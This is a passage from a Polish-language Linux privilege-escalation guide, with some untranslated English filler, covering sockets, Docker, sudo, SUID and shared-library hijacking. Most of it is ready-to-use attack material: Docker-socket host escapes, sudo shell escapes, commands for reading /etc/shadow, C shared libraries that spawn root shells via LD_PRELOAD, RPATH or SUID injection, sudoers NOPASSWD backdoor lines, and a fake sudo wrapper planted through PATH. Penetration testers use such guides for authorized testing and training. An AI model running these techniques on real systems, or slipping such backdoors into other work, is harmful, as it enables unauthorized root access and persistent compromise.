* `Service`: Określa nazwę jednostki **usługi do aktywacji** przy **przychodzącym ruchu**. Ta opcja jest dozwolona tylko dla gniazd z Accept=no. Domyślnie jest to usługa o tej samej nazwie jak socket (z zamienionym sufiksem). W większości przypadków nie powinno być konieczne korzystanie z tej opcji.

### Zapisywalne pliki .socket

Jeśli znajdziesz **zapisywalny** plik `.socket`, możesz **dodać** na początku sekcji `[Socket]` coś takiego jak: `ExecStartPre=/home/kali/sys/backdoor`, a backdoor zostanie uruchomiony przed utworzeniem gniazda. W związku z tym, **prawdopodobnie będziesz musiał poczekać, aż maszyna zostanie uruchomiona ponownie.**\
_Zauważ, że system musi korzystać z tej konfiguracji pliku socketowego, w przeciwnym razie backdoor nie zostanie uruchomiony._

### Zapisywalne sockety

Jeśli **zidentyfikujesz jakikolwiek zapisywalny socket** (_teraz mówimy o Unix Socketach, a nie o plikach konfiguracyjnych `.socket`_), to **możesz komunikować się** z tym socketem i być może wykorzystać podatność.

### Wyliczanie Unix Socketów
```bash
netstat -a -p --unix
```
### Połączenie bezpośrednie

To establish a raw connection to a target system, you can use tools like `netcat` or `telnet`. These tools allow you to connect to a specific IP address and port number, bypassing any higher-level protocols.

To connect using `netcat`, you can use the following command:

```bash
nc <target_ip> <port>
```

Replace `<target_ip>` with the IP address of the target system and `<port>` with the desired port number.

To connect using `telnet`, you can use the following command:

```bash
telnet <target_ip> <port>
```

Again, replace `<target_ip>` with the IP address of the target system and `<port>` with the desired port number.

Once the connection is established, you can send and receive data directly through the raw connection. This can be useful for testing network connectivity, debugging network protocols, or performing other low-level tasks.
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Przykład eksploatacji:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### Gniazdka HTTP

Należy zauważyć, że mogą istnieć **gniazdka nasłuchujące na żądania HTTP** (_nie mówię tutaj o plikach .socket, ale o plikach działających jako gniazdka unixowe_). Możesz to sprawdzić za pomocą:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Jeśli gniazdo **odpowiada żądaniem HTTP**, to można z nim **komunikować się** i być może **wykorzystać jakieś podatności**.

### Zapisywalne gniazdo Docker

Gniazdo Docker, często znajdujące się pod adresem `/var/run/docker.sock`, to krytyczny plik, który powinien być zabezpieczony. Domyślnie jest zapisywalny przez użytkownika `root` i członków grupy `docker`. Posiadanie uprawnień do zapisu w tym gnieździe może prowadzić do eskalacji uprawnień. Oto opis, jak to można zrobić, oraz alternatywne metody, jeśli nie jest dostępne CLI Dockera.

#### **Eskalacja uprawnień za pomocą Docker CLI**

Jeśli masz uprawnienia do zapisu w gnieździe Dockera, możesz eskalować uprawnienia za pomocą następujących poleceń:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Poniższe polecenia umożliwiają uruchomienie kontenera z dostępem na poziomie root do systemu plików hosta.

#### **Korzystanie bezpośrednio z interfejsu API Dockera**

W przypadkach, gdy nie jest dostępne CLI Dockera, gniazdo Dockera nadal można manipulować za pomocą interfejsu API Dockera i poleceń `curl`.

1. **Wyświetlanie obrazów Dockera:**
Pobierz listę dostępnych obrazów.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2. **Tworzenie kontenera:**
Wyślij żądanie utworzenia kontenera, który montuje główny katalog systemu hosta.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Uruchom nowo utworzony kontener:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3. **Podłączanie do kontenera:**
Użyj `socat` do nawiązania połączenia z kontenerem, umożliwiającego wykonywanie poleceń wewnątrz niego.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Po ustanowieniu połączenia `socat` można bezpośrednio wykonywać polecenia w kontenerze z dostępem na poziomie root do systemu plików hosta.

### Inne

Należy zauważyć, że jeśli masz uprawnienia do zapisu w gnieździe Dockera, ponieważ jesteś **w grupie `docker`**, masz [**więcej sposobów na eskalację uprawnień**](interesting-groups-linux-pe/#docker-group). Jeśli [**API Dockera nasłuchuje na porcie** możesz również go skompromitować](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Sprawdź **więcej sposobów na wyjście z Dockera lub nadużycie go do eskalacji uprawnień** w:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Eskalacja uprawnień w Containerd (ctr)

Jeśli odkryjesz, że możesz używać polecenia **`ctr`**, przeczytaj następującą stronę, ponieważ **możesz go wykorzystać do eskalacji uprawnień**:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## Eskalacja uprawnień w RunC

Jeśli odkryjesz, że możesz używać polecenia **`runc`**, przeczytaj następującą stronę, ponieważ **możesz go wykorzystać do eskalacji uprawnień**:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-Bus to zaawansowany **system komunikacji międzyprocesowej (IPC)**, który umożliwia aplikacjom efektywną interakcję i udostępnianie danych. Zaprojektowany z myślą o nowoczesnym systemie Linux, oferuje solidną platformę do różnych form komunikacji między aplikacjami.

System jest wszechstronny, obsługując podstawową IPC, która ułatwia wymianę danych między procesami, przypominając **ulepszone gniazda domenowe UNIX**. Ponadto, pomaga w rozgłaszaniu zdarzeń lub sygnałów, sprzyjając bezproblemowej integracji między komponentami systemu. Na przykład, sygnał od demona Bluetooth o nadchodzącym połączeniu może spowodować wyciszenie odtwarzacza muzyki, poprawiając w ten sposób doświadczenie użytkownika. Ponadto, D-Bus obsługuje zdalny system obiektów, upraszczając żądania usług i wywoływanie metod między aplikacjami, usprawniając procesy, które tradycyjnie były skomplikowane.

D-Bus działa na zasadzie **modelu zezwalaj/odmawiaj**, zarządzając uprawnieniami wiadomości (wywołań metod, emisji sygnałów itp.) na podstawie łącznego efektu zgodnych zasad polityki. Te polityki określają interakcje z magistralą, potencjalnie umożliwiając eskalację uprawnień poprzez wykorzystanie tych uprawnień.

Przykład takiej polityki w pliku `/etc/dbus-1/system.d/wpa_supplicant.conf` jest dostarczony, szczegółowo opisując uprawnienia dla użytkownika root do posiadania, wysyłania i odbierania wiadomości od `fi.w1.wpa_supplicant1`.

Polityki bez określonego użytkownika lub grupy mają zastosowanie uniwersalne, podczas gdy polityki kontekstu "domyślnego" mają zastosowanie do wszystkich, którzy nie są objęci innymi konkretnymi politykami.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Dowiedz się, jak wyliczać i wykorzystywać komunikację D-Bus tutaj:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **Sieć**

Zawsze jest interesujące wyliczyć sieć i ustalić pozycję maszyny.

### Ogólne wyliczanie
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Otwarte porty

Zawsze sprawdzaj usługi sieciowe działające na maszynie, z którymi nie byłeś w stanie wcześniej się komunikować, przed uzyskaniem do niej dostępu:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Sprawdź, czy możesz podsłuchiwać ruch sieciowy. Jeśli tak, możesz być w stanie przechwycić pewne dane uwierzytelniające.
```
timeout 1 tcpdump
```
## Użytkownicy

### Ogólne wyliczanie

Sprawdź **kto** jesteś, jakie **uprawnienia** posiadasz, jakie **użytkownicy** są w systemie, którzy mogą się **zalogować** i którzy mają **uprawnienia roota:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Duże UID

Niektóre wersje systemu Linux były dotknięte błędem, który umożliwia użytkownikom o **UID > INT\_MAX** eskalację uprawnień. Więcej informacji: [tutaj](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [tutaj](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) i [tutaj](https://twitter.com/paragonsec/status/1071152249529884674).\
**Wykorzystaj to** używając: **`systemd-run -t /bin/bash`**

### Grupy

Sprawdź, czy jesteś **członkiem jakiejś grupy**, która może przyznać Ci uprawnienia roota:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### Schowek

Sprawdź, czy w schowku znajduje się coś interesującego (jeśli to możliwe)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Polityka hasła

A strong password policy is essential for maintaining the security of a system. It helps prevent unauthorized access and protects sensitive information. Here are some key points to consider when implementing a password policy:

- **Password Complexity**: Require passwords to be complex, including a combination of uppercase and lowercase letters, numbers, and special characters. This makes it harder for attackers to guess or crack passwords.

- **Password Length**: Set a minimum password length to ensure passwords are not easily guessable. A longer password is generally more secure.

- **Password Expiration**: Enforce regular password changes to reduce the risk of compromised passwords. Users should be prompted to change their passwords after a certain period of time.

- **Password History**: Maintain a password history to prevent users from reusing old passwords. This ensures that compromised passwords cannot be reused in the future.

- **Account Lockout**: Implement an account lockout policy to protect against brute-force attacks. After a certain number of failed login attempts, the account should be locked for a specified period of time.

- **Password Storage**: Store passwords securely using strong encryption algorithms. Avoid storing passwords in plain text or weakly hashed formats.

- **User Education**: Educate users about the importance of strong passwords and the risks associated with weak passwords. Encourage them to choose unique and complex passwords.

By implementing a robust password policy, you can significantly enhance the security of your system and protect against unauthorized access.
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Znane hasła

Jeśli **znasz jakiekolwiek hasło** do środowiska, spróbuj zalogować się jako każdy użytkownik, używając tego hasła.

### Brute force dla su

Jeśli nie przeszkadza Ci generowanie dużej ilości hałasu i na komputerze są obecne binarne pliki `su` i `timeout`, możesz spróbować przeprowadzić atak brute force na użytkowników za pomocą narzędzia [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) z parametrem `-a` również próbuje przeprowadzić atak brute force na użytkowników.

## Nadużycia zapisywalnych ścieżek

### $PATH

Jeśli odkryjesz, że możesz **zapisywać wewnątrz pewnego folderu w $PATH**, możesz próbować podwyższyć uprawnienia, tworząc tylną furtkę w zapisywalnym folderze o nazwie jakiejś komendy, która zostanie wykonana przez innego użytkownika (najlepiej roota) i która **nie jest ładowana z folderu, który znajduje się wcześniej** niż twój zapisywalny folder w $PATH.

### SUDO i SUID

Możesz mieć uprawnienia do wykonania pewnej komendy za pomocą sudo lub mogą mieć ustawiony bit suid. Sprawdź to, używając:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Niektóre **nieoczekiwane polecenia pozwalają na odczyt i/lub zapis plików, a nawet wykonanie polecenia**. Na przykład:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Konfiguracja Sudo może umożliwić użytkownikowi wykonanie pewnej komendy z uprawnieniami innego użytkownika bez konieczności podawania hasła.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
W tym przykładzie użytkownik `demo` może uruchomić `vim` jako `root`, teraz jest banalnie łatwo uzyskać powłokę, dodając klucz ssh do katalogu roota lub wywołując `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ta dyrektywa umożliwia użytkownikowi **ustawienie zmiennej środowiskowej** podczas wykonywania czegoś:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ten przykład, **oparty na maszynie HTB Admirer**, był **podatny** na **przechwycenie PYTHONPATH** w celu załadowania dowolnej biblioteki pythona podczas wykonywania skryptu jako root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Omijanie ścieżek przy wykonywaniu sudo

**Skok** do odczytu innych plików lub użycie **symlinków**. Na przykład w pliku sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Jeśli używany jest **znak wieloznaczny** (\*), jest jeszcze łatwiej:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Przeciwdziałanie**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Polecenie Sudo/Binarna SUID bez ścieżki polecenia

Jeśli **uprawnienia sudo** są udzielone dla pojedynczego polecenia **bez określania ścieżki**: _hacker10 ALL= (root) less_, można je wykorzystać, zmieniając zmienną PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ta technika może być również użyta, jeśli binarny plik **suid** wykonuje inną komendę bez podawania ścieżki do niej (zawsze sprawdzaj zawartość podejrzanego binarnego pliku **suid** za pomocą polecenia **_strings_**).

[Przykłady ładunków do wykonania.](payloads-to-execute.md)

### Binarny plik **suid** z podaną ścieżką do komendy

Jeśli binarny plik **suid** wykonuje inną komendę, podając jej ścieżkę, możesz spróbować **wyeksportować funkcję** o nazwie takiej jak komenda, którą wywołuje plik **suid**.

Na przykład, jeśli binarny plik **suid** wywołuje _**/usr/sbin/service apache2 start**_, musisz spróbować utworzyć funkcję o tej samej nazwie i ją wyeksportować:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Następnie, gdy wywołasz binarny plik suid, ta funkcja zostanie wykonana

### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

Zmienna środowiskowa **LD_PRELOAD** jest używana do określenia jednej lub więcej bibliotek współdzielonych (.so), które mają być załadowane przez loader przed wszystkimi innymi, włącznie z biblioteką standardową C (`libc.so`). Ten proces jest znany jako preloading biblioteki.

Jednakże, w celu utrzymania bezpieczeństwa systemu i zapobieżenia wykorzystaniu tej funkcji, zwłaszcza w przypadku plików wykonywalnych **suid/sgid**, system narzuca pewne warunki:

- Loader ignoruje **LD_PRELOAD** dla plików wykonywalnych, w których rzeczywiste ID użytkownika (_ruid_) nie pasuje do efektywnego ID użytkownika (_euid_).
- Dla plików wykonywalnych z suid/sgid, tylko biblioteki w standardowych ścieżkach, które również mają suid/sgid, są preloaded.

Eskalacja uprawnień może wystąpić, jeśli masz możliwość wykonywania poleceń za pomocą `sudo`, a wynik `sudo -l` zawiera instrukcję **env_keep+=LD_PRELOAD**. Ta konfiguracja pozwala na utrzymanie zmiennej środowiskowej **LD_PRELOAD** i jej rozpoznawanie nawet podczas uruchamiania poleceń za pomocą `sudo`, co potencjalnie prowadzi do wykonania dowolnego kodu z podwyższonymi uprawnieniami.
```
Defaults        env_keep += LD_PRELOAD
```
Zapisz jako **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Następnie **skompiluj go** używając:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
W końcu, **podnieś uprawnienia** uruchamiając
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
Podobne podniesienie uprawnień może być wykorzystane, jeśli atakujący kontroluje zmienną środowiskową **LD\_LIBRARY\_PATH**, ponieważ kontroluje ścieżkę, w której będą wyszukiwane biblioteki.
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – wstrzyknięcie .so

W przypadku napotkania binarnego pliku z uprawnieniami **SUID**, które wydają się nietypowe, dobrą praktyką jest sprawdzenie, czy poprawnie wczytuje pliki **.so**. Można to sprawdzić, wykonując następujące polecenie:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na przykład, napotkanie błędu takiego jak _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (Nie ma takiego pliku ani katalogu)"_ sugeruje potencjał do wykorzystania.

Aby wykorzystać to, należy utworzyć plik C, na przykład _"/path/to/.config/libcalc.c"_, zawierający następujący kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ten kod, po skompilowaniu i uruchomieniu, ma na celu podniesienie uprawnień poprzez manipulację uprawnieniami plików i uruchomienie powłoki z podwyższonymi uprawnieniami.

Skompiluj powyższy plik C do pliku obiektowego współdzielonego (.so) za pomocą:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
## Przechwytywanie współdzielonego obiektu

Przechwytywanie współdzielonego obiektu to technika eskalacji uprawnień, która polega na wykorzystaniu błędów w konfiguracji systemu plików, które umożliwiają zastąpienie oryginalnego współdzielonego obiektu przez złośliwy odpowiednik. Gdy aplikacja uruchamia współdzielony obiekt, zamiast oryginalnego, wykorzystywany jest złośliwy obiekt, co może prowadzić do kompromitacji systemu.

Aby przeprowadzić atak przechwytywania współdzielonego obiektu, należy znaleźć aplikację, która korzysta z współdzielonego obiektu i ma błąd w konfiguracji systemu plików. Następnie należy umieścić złośliwy obiekt o takiej samej nazwie w katalogu, który jest wcześniej w kolejce przeszukiwania przez system. Gdy aplikacja zostanie uruchomiona, system użyje złośliwego obiektu zamiast oryginalnego, co umożliwia wykonanie kodu z uprawnieniami aplikacji.

Aby zabezpieczyć się przed atakami przechwytywania współdzielonego obiektu, należy regularnie aktualizować oprogramowanie, aby naprawić błędy w konfiguracji systemu plików. Ponadto, należy ograniczyć uprawnienia dostępu do katalogów, w których znajdują się współdzielone obiekty, aby uniemożliwić złośliwym użytkownikom ich modyfikację.
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Teraz, gdy znaleźliśmy binarny plik SUID, który ładuje bibliotekę z folderu, w którym możemy zapisywać, stwórzmy bibliotekę o odpowiedniej nazwie w tym folderze:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Jeśli otrzymasz błąd tak jak poniżej:
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to oznacza, że wygenerowana biblioteka musi mieć funkcję o nazwie `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) to kuratowana lista binarnych plików Unix, które mogą zostać wykorzystane przez atakującego do obejścia lokalnych ograniczeń bezpieczeństwa. [**GTFOArgs**](https://gtfoargs.github.io/) to to samo, ale dla przypadków, w których można **tylko wstrzyknąć argumenty** do polecenia.

Projekt gromadzi legalne funkcje binarnych plików Unix, które mogą być nadużywane do wyjścia z ograniczonych powłok, eskalacji lub utrzymania podwyższonych uprawnień, transferu plików, uruchamiania powłok bind i odwróconych oraz ułatwiania innych zadań po eksploatacji.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

Jeśli masz dostęp do `sudo -l`, możesz użyć narzędzia [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo), aby sprawdzić, czy znajduje sposób na wykorzystanie jakiejkolwiek reguły sudo.

### Ponowne wykorzystanie tokenów sudo

W przypadkach, gdy masz **dostęp do sudo**, ale nie masz hasła, możesz podnieść uprawnienia, **oczekując na wykonanie polecenia sudo, a następnie przejęcie tokena sesji**.

Wymagania do podniesienia uprawnień:

* Masz już powłokę jako użytkownik "_sampleuser_"
* "_sampleuser_" **użył `sudo`** do wykonania czegoś w **ostatnich 15 minutach** (domyślnie jest to czas trwania tokena sudo, który pozwala nam używać `sudo` bez wprowadzania hasła)
* `cat /proc/sys/kernel/yama/ptrace_scope` wynosi 0
* `gdb` jest dostępne (możesz go przesłać)

(Możesz tymczasowo włączyć `ptrace_scope` za pomocą `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` lub trwale modyfikując `/etc/sysctl.d/10-ptrace.conf` i ustawiając `kernel.yama.ptrace_scope = 0`)

Jeśli spełnione są wszystkie te wymagania, **możesz podnieść uprawnienia za pomocą:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* **Pierwszy exploit** (`exploit.sh`) utworzy binarny plik `activate_sudo_token` w _/tmp_. Możesz go użyć do **aktywacji tokena sudo w swojej sesji** (nie otrzymasz automatycznie powłoki roota, wykonaj `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* Drugie wykorzystanie (`exploit_v2.sh`) utworzy powłokę sh w _/tmp_ **należącą do roota z ustawionym setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* Trzeci exploit (`exploit_v3.sh`) **utworzy plik sudoers**, który sprawi, że **tokeny sudo będą wieczne i umożliwi wszystkim użytkownikom korzystanie z sudo**.
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Nazwa użytkownika>

Jeśli masz **uprawnienia do zapisu** w folderze lub na którymkolwiek z utworzonych plików wewnątrz folderu, możesz użyć binarnego pliku [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools), aby **utworzyć token sudo dla użytkownika i PID**.\
Na przykład, jeśli możesz nadpisać plik _/var/run/sudo/ts/sampleuser_ i masz powłokę jako ten użytkownik z PID 1234, możesz **uzyskać uprawnienia sudo** bez konieczności znanie hasła, wykonując:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Plik `/etc/sudoers` oraz pliki wewnątrz `/etc/sudoers.d` konfigurują, kto może używać `sudo` i w jaki sposób. Te pliki **domyślnie mogą być odczytywane tylko przez użytkownika root i grupę root**.\
**Jeśli** możesz **odczytać** ten plik, możesz być w stanie **uzyskać pewne interesujące informacje**, a jeśli możesz **zapisać** dowolny plik, będziesz mógł **przywilejami eskalować**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Jeśli potrafisz pisać, możesz nadużyć tego uprawnienia.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Inny sposób na wykorzystanie tych uprawnień:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Istnieją pewne alternatywy dla binarnego pliku `sudo`, takie jak `doas` dla OpenBSD. Pamiętaj, aby sprawdzić jego konfigurację w `/etc/doas.conf`.
```
permit nopass demo as root cmd vim
```
### Przechwytywanie sudo

Jeśli wiesz, że **użytkownik zazwyczaj łączy się z maszyną i używa `sudo`** do podniesienia uprawnień, a masz dostęp do powłoki w kontekście tego użytkownika, możesz **utworzyć nowy plik wykonywalny sudo**, który będzie uruchamiał twój kod jako root, a następnie polecenie użytkownika. Następnie **zmodyfikuj $PATH** kontekstu użytkownika (na przykład dodając nową ścieżkę w .bash\_profile), aby po wykonaniu sudo, uruchamiany był twój plik sudo.

Należy zauważyć, że jeśli użytkownik używa innej powłoki (nie bash), będziesz musiał zmodyfikować inne pliki, aby dodać nową ścieżkę. Na przykład [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modyfikuje `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Innym przykładem jest [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)

Lub wykonując coś takiego jak:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Współdzielona biblioteka

### ld.so

Plik `/etc/ld.so.conf` wskazuje, **skąd pochodzą załadowane pliki konfiguracyjne**. Zazwyczaj ten plik zawiera następującą ścieżkę: `include /etc/ld.so.conf.d/*.conf`

Oznacza to, że pliki konfiguracyjne z `/etc/ld.so.conf.d/*.conf` zostaną odczytane. Te pliki konfiguracyjne **wskazują na inne foldery**, w których będą **szukane biblioteki**. Na przykład zawartość pliku `/etc/ld.so.conf.d/libc.conf` to `/usr/local/lib`. **Oznacza to, że system będzie szukał bibliotek wewnątrz `/usr/local/lib`**.

Jeśli z jakiegoś powodu **użytkownik ma uprawnienia do zapisu** w którymkolwiek z podanych ścieżek: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, dowolny plik wewnątrz `/etc/ld.so.conf.d/` lub dowolny folder wewnątrz pliku konfiguracyjnego w `/etc/ld.so.conf.d/*.conf`, może on próbować podwyższyć uprawnienia.\
Zobacz **jak wykorzystać tę nieprawidłową konfigurację** na następnej stronie:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiując bibliotekę do `/var/tmp/flag15/`, zostanie ona użyta przez program w tym miejscu, jak określono w zmiennej `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Następnie utwórz złośliwą bibliotekę w `/var/tmp` za pomocą polecenia `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`.
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Uprawnienia

